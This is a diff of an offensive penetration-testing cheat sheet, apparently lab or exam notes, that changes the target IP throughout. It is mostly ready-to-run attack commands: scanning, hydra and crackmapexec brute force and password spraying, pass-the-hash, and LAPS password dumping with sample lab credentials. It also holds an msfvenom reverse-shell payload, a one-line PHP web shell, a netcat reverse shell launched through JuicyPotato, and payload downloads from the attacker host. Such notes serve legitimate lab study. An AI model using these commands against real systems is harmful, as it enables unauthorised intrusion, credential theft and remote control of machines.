@@ -1,23 +1,23 @@
 ---
-Target IP: 192.168.177.175
+Target IP: 192.168.188.40
 Attacker IP: 192.168.45.233
 ---
 #### nmap Command
 ```bash
-ping -c 4 192.168.177.175
+ping -c 4 192.168.188.40
 # Ping sweep scan
-nmap -sn 192.168.177.175
+nmap -sn 192.168.188.40
 # This will do the ping scan instead of ARP on port 80
-nmap -sn -PS 192.168.177.175
+nmap -sn -PS 192.168.188.40
 # We can also specify the port or port range
-nmap -sn -PS22 192.168.177.175
-nmap -sn -PS1-1000 192.168.177.175
+nmap -sn -PS22 192.168.188.40
+nmap -sn -PS1-1000 192.168.188.40
 # Default port scan with version detection and default script findings
-nmap -sCSV --min-rate=5000 -T4 192.168.177.175 -v -oN nmap-initial.log
+nmap -sCSV --min-rate=5000 -T4 192.168.188.40 -v -oN nmap-initial.log
 
 ## 1. All port scan | add -Pn if needed 
 # -Pn: Skips host discovery; assumes the host is online.
-nmap -p- --min-rate=5000 -T4 192.168.177.175 -v -oN nmap-all-ports.log
+nmap -p- --min-rate=5000 -T4 192.168.188.40 -v -oN nmap-all-ports.log
 
 ## 2. Create ports variable in shell from the all port scan result 
 ports=$(cat nmap-all-ports.log | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
@@ -25,18 +25,18 @@ ports=$(cat nmap-all-ports.log | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' |
 ## 3. Launch version detection and script scan with the all port scan result
 # -sS: SYN (Stealth) scan | Normal flow SYN - SYNACK - ACK
 # Stealth flow SYN-SYNACK-RST
-nmap -p$ports -sCSV 192.168.177.175 -v -oN nmap-services.log
+nmap -p$ports -sCSV 192.168.188.40 -v -oN nmap-services.log
 
 # Best practice scan for UDP ports as well
-sudo nmap -Pn -n 192.168.177.175 -sU --top-ports=100 --reason
+sudo nmap -Pn -n 192.168.188.40 -sU --top-ports=100 --reason
 
-sudo nmap -sU --top-ports 100 192.168.177.175
+sudo nmap -sU --top-ports 100 192.168.188.40
 
 # SMB enum
-sudo nmap -Pn -p139,445 -T4 --script "discovery and smb*" 192.168.177.175
+sudo nmap -Pn -p139,445 -T4 --script "discovery and smb*" 192.168.188.40
 
 # SNMP enum
-sudo nmap -sU -p161 --script "*snmp*" 192.168.177.175
+sudo nmap -sU -p161 --script "*snmp*" 192.168.188.40
 
 # To use Nmap to determine the best service name, you can use the -sV command to perform a service and version detection scan:
 nmap 192.168.1.1 -sV
@@ -76,31 +76,31 @@ nmap 192.168.1.1 -sV -version-all
 gobuster -k to skip the ssl certificate verification
 
 # Directory fuzzing dirlist - common
-gobuster dir -u http://192.168.177.175 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster-80.log -t 42 -b 400,404 --no-error
+gobuster dir -u http://192.168.188.40 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster-80.log -t 42 -b 400,404 --no-error
 
 # Directory fuzzing dirlist - **raft medium** words/files
-gobuster dir -u http://192.168.177.175 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error
+gobuster dir -u http://192.168.188.40 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error
 
 # Directory fuzzing dirlist - big
-gobuster dir -u http://192.168.177.175 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
+gobuster dir -u http://192.168.188.40 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
 
 # Directory fuzzing dirlist - dir 2.3 medium
-gobuster dir -u http://192.168.177.175 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
+gobuster dir -u http://192.168.188.40 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
 
 # Directory fuzzing dirlist - dir 2.3 small
-gobuster dir -u http://192.168.177.175 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
+gobuster dir -u http://192.168.188.40 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
 
 # Directory fuzzing dirlist - **raft small** words/files
-gobuster dir -u http://192.168.177.175 -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error
+gobuster dir -u http://192.168.188.40 -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error
 
 # Directory fuzzing dirlist - **raft large** words/files
-gobuster dir -u http://192.168.177.175 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error -x php,html,txt
+gobuster dir -u http://192.168.188.40 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error -x php,html,txt
 
 # Exclude length
-gobuster dir -u http://192.168.177.175 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --exclude-length <LENGTH> -o gobuster-v2-80.log
+gobuster dir -u http://192.168.188.40 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --exclude-length <LENGTH> -o gobuster-v2-80.log
 
 # Subdomain fuzzing
-gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://192.168.177.175
+gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://192.168.188.40
 ```
 
 #### cURL
@@ -111,34 +111,34 @@ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.
 
 # 1. Basic GET Request (Fetch Web Page)
 # -X: Specify the HTTP method (GET is default, so this can be omitted)
-curl -X GET http://192.168.177.175
+curl -X GET http://192.168.188.40
 
 # 2. Send POST Request with Form Data (Test Login Forms)
 # -d: Send data in a POST request
-curl -X POST -d "username=admin&password=1234" http://192.168.177.175/login
+curl -X POST -d "username=admin&password=1234" http://192.168.188.40/login
 
 # 3. Capture Server Response Headers (Find Security Headers)
 # -I: Fetch headers only (HEAD request)
-curl -I http://192.168.177.175
+curl -I http://192.168.188.40
 # show response header in output
-curl -i http://192.168.177.175
+curl -i http://192.168.188.40
 
 # 4. Follow Redirects (Useful for Open Redirect Testing)
 # -L: Follow 3xx redirects
-curl -L http://192.168.177.175
+curl -L http://192.168.188.40
 
 # 5. Upload a File (Test File Upload Functionality)
 # -F: Send multipart form data
-curl -X POST -F "file=@shell.php" http://192.168.177.175/upload
+curl -X POST -F "file=@shell.php" http://192.168.188.40/upload
 
 # 6. Send JSON Data (API Security Testing)
 # -H: Set HTTP headers (Content-Type)
 # -d: Send data payload
-curl -X POST -H "Content-Type: application/json" -d '{"user":"admin", "pass":"1234"}' http://192.168.177.175/api/login
+curl -X POST -H "Content-Type: application/json" -d '{"user":"admin", "pass":"1234"}' http://192.168.188.40/api/login
 
 # 7. Test Authentication with Basic Auth (Brute-Force Possible)
 # -u: Provide credentials (Basic Authentication)
-curl -u "admin:password" http://192.168.177.175/protected
+curl -u "admin:password" http://192.168.188.40/protected
 
 # 8. Use Proxy for Traffic Analysis (Intercept with BurpSuite/ZAP)
 # -x: Use a proxy (e.g., BurpSuite running on 127.0.0.1:8080)
@@ -147,12 +147,12 @@ curl -x http://127.0.0.1:8080 -X GET http://example.com
 # 9. Extract API Keys or Secrets from Response (Useful for Recon)
 # -s: Silent mode (no progress output)
 # | grep: Filter response to find specific strings
-curl -s http://192.168.177.175 | grep -i "api_key"
+curl -s http://192.168.188.40 | grep -i "api_key"
 
 # 10. Test Rate Limiting (Send 100 Requests Quickly)
 # seq: Generate numbers (1 to 100)
 # xargs: Execute multiple curl requests in parallel (-P 10)
-seq 1 100 | xargs -I {} -P 10 curl -X GET http://192.168.177.175
+seq 1 100 | xargs -I {} -P 10 curl -X GET http://192.168.188.40
 
 # ===========================================================
 # 🔥 Tips for Advanced Use:
@@ -193,38 +193,38 @@ rsync -av home_user/.ssh/ rsync://user@target_host/home_user/.ssh
 #### Network File Share (NFS) Enum
 ```bash
 # Nmap with NFS Scripts
-nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 192.168.177.175
+nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 192.168.188.40
 ```
 #### DNS Enum
 ```bash
 # DNS Zone transfer
-dig @192.168.177.175 axfr <dns_name>
+dig @192.168.188.40 axfr <dns_name>
 
 # dns enum
-dnsenum 192.168.177.175
+dnsenum 192.168.188.40
 ```
 #### SMB Enum
 ```bash
-nmap -script=smb-vuln\* -p445 192.168.177.175
+nmap -script=smb-vuln\* -p445 192.168.188.40
 
-enum4linux -a 192.168.177.175 
+enum4linux -a 192.168.188.40 
 # Enumerate using login credentials:
-enum4linux -u user_name -p password 192.168.177.175
+enum4linux -u user_name -p password 192.168.188.40
 # Enumerate user list:
-enum4linux -U 192.168.177.175
+enum4linux -U 192.168.188.40
   
-smbclient -N -L //192.168.177.175//
+smbclient -N -L //192.168.188.40//
 
-smbclient -L 192.168.177.175 --option="client min protocol=core" -U ''
+smbclient -L 192.168.188.40 --option="client min protocol=core" -U ''
 
 # Connect with a username:
-smbclient //192.168.177.175/share -U username
+smbclient //192.168.188.40/share -U username
 # Connect with a workgroup:
-smbclient //192.168.177.175/share --workgroup domain -U username
+smbclient //192.168.188.40/share --workgroup domain -U username
 # Connect with a username and password:
-smbclient //192.168.177.175/share -U username%password
+smbclient //192.168.188.40/share -U username%password
   
-crackmapexec smb 192.168.177.175 --shares
+crackmapexec smb 192.168.188.40 --shares
 ```
 #### LinPEAS
 ```bash
@@ -255,29 +255,29 @@ crackmapexec --help
 cracmapexec smb --help
 
 # Null session
-crackmapexec smb 192.168.177.175 -u "" up ""
+crackmapexec smb 192.168.188.40 -u "" up ""
 # Connect to target using local account
-crackmapexec smb 192.168.177.175 -u 'Administrator' -p 'PASSWORD' --local-auth
+crackmapexec smb 192.168.188.40 -u 'Administrator' -p 'PASSWORD' --local-auth
 # Pass the hash against a subnet
-crackmapexec smb 192.168.177.175 -u administrator -H 'LMHASH:NTHASH' --local-auth
-crackmapexec smb 192.168.177.175 -u administrator -H 'NTHASH'
+crackmapexec smb 192.168.188.40 -u administrator -H 'LMHASH:NTHASH' --local-auth
+crackmapexec smb 192.168.188.40 -u administrator -H 'NTHASH'
 # Bruteforcing and Password Spraying
-crackmapexec smb 192.168.177.175 -u "admin" -p "password1"
-crackmapexec smb 192.168.177.175 -u "admin" -p "password1" "password2"
-crackmapexec smb 192.168.177.175 -u "admin1" "admin2" -p "P@ssword"
-crackmapexec smb 192.168.177.175 -u user_file.txt -p pass_file.txt
-crackmapexec smb 192.168.177.175 -u user_file.txt -H ntlm_hashFile.txt
+crackmapexec smb 192.168.188.40 -u "admin" -p "password1"
+crackmapexec smb 192.168.188.40 -u "admin" -p "password1" "password2"
+crackmapexec smb 192.168.188.40 -u "admin1" "admin2" -p "P@ssword"
+crackmapexec smb 192.168.188.40 -u user_file.txt -p pass_file.txt
+crackmapexec smb 192.168.188.40 -u user_file.txt -H ntlm_hashFile.txt
 ```
 #### LDAP Enum
 ```bash
 #If LDAP running some LDAP related `nmap` scripts to enumerate
-nmap -n -sV --script "ldap* and not brute" 192.168.177.175
+nmap -n -sV --script "ldap* and not brute" 192.168.188.40
 
 # we can run LDAP search with the naming context included to enumerate users and grep by SAM account name.
-ldapsearch -x -H "ldap://192.168.177.175" -D '' -w '' -b "DC=resourced,DC=local" | grep sAMAccountName
+ldapsearch -x -H "ldap://192.168.188.40" -D '' -w '' -b "DC=hokkaido-aerospace,DC=com" | grep sAMAccountName
 
 # Its possible that LAPS or LDAP has been misconfigured enough to potentially contains the computer passwords for computer object in AD. Knowing this we can go back and search LDAP with the credentials with have specifically looking for the _ms-Mcs-AdmPwd attribute.
-ldapsearch -x -H "ldap://192.168.177.175" -D 'domain\username' -w 'password' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
+ldapsearch -x -H "ldap://192.168.188.40" -D 'domain\username' -w 'password' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
 
 # Dumping the LAPS Password with crackmapexec
 crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps
@@ -309,8 +309,11 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.233 LPORT=4444 -f exe
 # php revshell smallest
 <?=`$_GET[cmd]`?>
 
-# all network connections
+# all network connections (linux)
 netstat -anp
+
+# windows for all tcp connection
+netstat -an | findstr /i /v  UDP  # /i to ignore case /v to exclude udp
 
 # command find out which process is listing upon a port
 netstat -tulpn
@@ -397,42 +400,42 @@ wfuzz -c -w /path/to/wordlist.txt -p 127.0.0.1:8080 http://example.com/FUZZ
 #### dirsearch
 ```bash
 # Top command 
-dirsearch -u http://192.168.177.175 -e php,html -x 400,500 -r -t 8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+dirsearch -u http://192.168.188.40 -e php,html -x 400,500 -r -t 8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 # -e for specific extension comma seperated 
 # -x to exclude status code 
 # -r recursive to 1 level 
 # -t thread count 
 # Perform a basic scan against a target URL 
-dirsearch -u http://192.168.177.175 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 403  
+dirsearch -u http://192.168.188.40 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 403  
 # Use a custom wordlist for directory and file brute-forcing: 
-dirsearch -u http://192.168.177.175 -w /path/to/wordlist.txt 
+dirsearch -u http://192.168.188.40 -w /path/to/wordlist.txt 
 # Specify file extensions to look for during the scan: 
-dirsearch -u http://192.168.177.175 -e php,txt,html 
+dirsearch -u http://192.168.188.40 -e php,txt,html 
 # Recursively scan subdirectories for directories and files:
-dirsearch -u http://192.168.177.175 -r
+dirsearch -u http://192.168.188.40 -r
 # Save scan results to a file: 
-dirsearch -u http://192.168.177.175 -o dirseacrh.txt 
+dirsearch -u http://192.168.188.40 -o dirseacrh.txt 
 # Specify custom HTTP headers for the requests: 
-dirsearch -u http://192.168.177.175 -H "User-Agent: Mozilla/5.0"
+dirsearch -u http://192.168.188.40 -H "User-Agent: Mozilla/5.0"
 ```
 #### hydra
 ```bash
 # Basic command
-hydra -l <username> -P /usr/share/wordlists/rockyou.txt <protocol>://192.168.177.175 -t 4
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt <protocol>://192.168.188.40 -t 4
 
 # For FTP
-hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <protocol>://192.168.177.175 -t 4
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <protocol>://192.168.188.40 -t 4
 
 # -t :: Number of thread followed by the number
 
 # base64 encoded credentials and response as 403 forbidden
-hydra -L usernames.txt -P passwords.txt 192.168.177.175 -s 8081 http-post-form '/service/rapture/session:username=^USER64^&password=^PASS64^:Forbidden'
+hydra -L usernames.txt -P passwords.txt 192.168.188.40 -s 8081 http-post-form '/service/rapture/session:username=^USER64^&password=^PASS64^:Forbidden'
 
 # Post web login forms
-hydra -l <username> -P /usr/share/wordlists/rockyou.txt 192.168.177.175 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt 192.168.188.40 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
 
 # Hydra basic authentication
-hydra -l bob -P /usr/share/wordlists/rockyou.txt "http-get://192.168.177.175/protected:A=BASIC:F=401"
+hydra -l bob -P /usr/share/wordlists/rockyou.txt "http-get://192.168.188.40/protected:A=BASIC:F=401"
 
 # -L :: for username file
 # -l :: for username as string
@@ -446,7 +449,7 @@ hydra -l bob -P /usr/share/wordlists/rockyou.txt "http-get://192.168.177.175/pro
 # -u : rotate around usernames, not passwords
 # -P : passwords list
 
-hydra -I -V -f -L usernames.txt -u -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt 192.168.177.175 ftp
+hydra -I -V -f -L usernames.txt -u -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt 192.168.188.40 ftp
 ```
 #### Netcat with rlwrap
 ```bash
@@ -547,7 +550,7 @@ net localgroup 'Remote Desktop Users' balai /add
 # Escalate to SYSTEM with PsExec.exe
 # Latest psexec tool https://download.sysinternals.com/files/PSTools.zip
 # Transfer tje psexec file
-scp ./PsExec64.exe USER@192.168.177.175:C:/Users/ariah/Downloads/psexec.exe
+scp ./PsExec64.exe USER@192.168.188.40:C:/Users/ariah/Downloads/psexec.exe
 # Then execute the command from elevated (administrator) terminal
 psexec.exe -accepteula -s cmd.exe
 # We can use the impacket-psexec command as well if we have smb access
@@ -610,7 +613,7 @@ impacket-smbserver share_name share_path -smb2support
 copy \\192.168.45.233\share\ignite.txt
 
 # To transfer the file from kali linux to the windows machine
-scp test.txt user@192.168.177.175:/C:/Temp
+scp test.txt user@192.168.188.40:/C:/Temp
 
 # File transfer CMD
 powershell iwr http://192.168.45.233/nc64.exe -outfile nc64.exe
@@ -630,13 +633,13 @@ juicypotatox86.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {9B1F122C-2982
 juicypotatox86.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe 192.168.45.233" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
 
 # if port 135 rpc (remote procedure call) is open then we can try below commands to interact with the process
-rpcclient -U '' -N 192.168.177.175
+rpcclient -U '' -N 192.168.188.40
 
 # set path if it set to something else check with echo %PATH%
 set PATH=%PATH%;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\dotnet\
 
 # connect to rdp running of port
-rdesktop 192.168.177.175
+rdesktop 192.168.188.40
 
 # To download file in windows
 certutil -urlcache -f http://192.168.45.233 path-output-file-name
@@ -941,7 +944,7 @@ Now browse the ports on http://240.0.0.1:PORT
 #### Smbclient
 ```bash
 # List SMB shares:
-smbclient -L //server_name -c 'recurse;ls'
+smbclient -L //server_name
 smbclient -L spookysec.local -U svc-admin%management2005
 
 # Direct link to a share using backslash
@@ -992,10 +995,10 @@ smbclient //server/share -U username -c 'chmod 755 file'
 #### SMBMap
 ```bash
 # Scan a single host for SMB shares
-smbmap -H 192.168.177.175
+smbmap -H 192.168.188.40
 
 # For anonymous/guest access
-smbmap -u 'guest' -p '' -H 192.168.177.175
+smbmap -u 'guest' -p '' -H 192.168.188.40
 
 # Scan multiple hosts for SMB shares from a file
 smbmap -H <target_ip_file.txt>
@@ -1004,37 +1007,37 @@ smbmap -H <target_ip_file.txt>
 ########################
 
 # Scan with username and password
-smbmap -H 192.168.177.175 -u <username> -p <password>
+smbmap -H 192.168.188.40 -u <username> -p <password>
 
 # Scan with username and prompt for password
-smbmap -H 192.168.177.175 -u <username>
+smbmap -H 192.168.188.40 -u <username>
 
 # Scan with NTLM hash
-smbmap -H 192.168.177.175 -u <username> -H <NTLM_hash>
+smbmap -H 192.168.188.40 -u <username> -H <NTLM_hash>
 
 # Scan with Kerberos ticket
-smbmap -H 192.168.177.175 --kerberos
+smbmap -H 192.168.188.40 --kerberos
 ```
 #### Crackmapexec
 ```bash
 # SMB enumeration
-crackmapexec smb 192.168.177.175 -u guest -p '' --shares
+crackmapexec smb 192.168.188.40 -u guest -p '' --shares
 
 # To check the valid user and hashesh, we can use crackmapexec
-crackmapexec winrm 192.168.177.175 -u <username file> -H <hash file>
+crackmapexec winrm 192.168.188.40 -u <username file> -H <hash file>
 
 ```
 #### Wpscan
 ```shell
 # Enumerate WordPress version
-wpscan --url http://192.168.177.175 --enumerate v
+wpscan --url http://192.168.188.40 --enumerate v
 # Scan with API token
-wpscan --url http://192.168.177.175 --api-token <your_api_token>
+wpscan --url http://192.168.188.40 --api-token <your_api_token>
 # HTTP basic authentication
-wpscan --url http://192.168.177.175 --http-auth <username>:<password>
+wpscan --url http://192.168.188.40 --http-auth <username>:<password>
 # Enumerate plugins, themes, and users
 
-wpscan --url http://192.168.177.175 --enumerate ap,t,u --plugins-detection aggressive -o wpscan.txt
+wpscan --url http://192.168.188.40 --enumerate ap,t,u --plugins-detection aggressive -o wpscan.txt
 # if use -o option then it will not show any output
 
 # --enumerate → Enables enumeration of specific WordPress components.
@@ -1043,21 +1046,21 @@ wpscan --url http://192.168.177.175 --enumerate ap,t,u --plugins-detection aggre
 # u → Enumerates all users.
 
 # Brute force usernames
-wpscan --url http://192.168.177.175 --enumerate u --passwords <password_list>
+wpscan --url http://192.168.188.40 --enumerate u --passwords <password_list>
 # Brute force passwords for a specific user
-wpscan --url http://192.168.177.175 -U <username> -P <password_list>
+wpscan --url http://192.168.188.40 -U <username> -P <password_list>
 # Scan with a proxy
-wpscan --url http://192.168.177.175 --proxy <proxy_ip:port>
+wpscan --url http://192.168.188.40 --proxy <proxy_ip:port>
 # Scan for known vulnerabilities
-wpscan --url http://192.168.177.175 --enumerate vp
+wpscan --url http://192.168.188.40 --enumerate vp
 # Enumerate plugins with vulnerability checks
-wpscan --url http://192.168.177.175 --api-token YOUR_API_TOKEN --enumerate vp
+wpscan --url http://192.168.188.40 --api-token YOUR_API_TOKEN --enumerate vp
 # Brute force usernames
-wpscan --url http://192.168.177.175 --enumerate u --passwords /path/to/passwords.txt
+wpscan --url http://192.168.188.40 --enumerate u --passwords /path/to/passwords.txt
 # Brute force password for a specific user
-wpscan --url http://192.168.177.175 -U admin -P /path/to/passwords.txt
+wpscan --url http://192.168.188.40 -U admin -P /path/to/passwords.txt
 # Scan using an HTTP proxy
-wpscan --url http://192.168.177.175 --proxy 127.0.0.1:8080
+wpscan --url http://192.168.188.40 --proxy 127.0.0.1:8080
 ```
 #### LXD Group Access Priv Esc
 ```bash
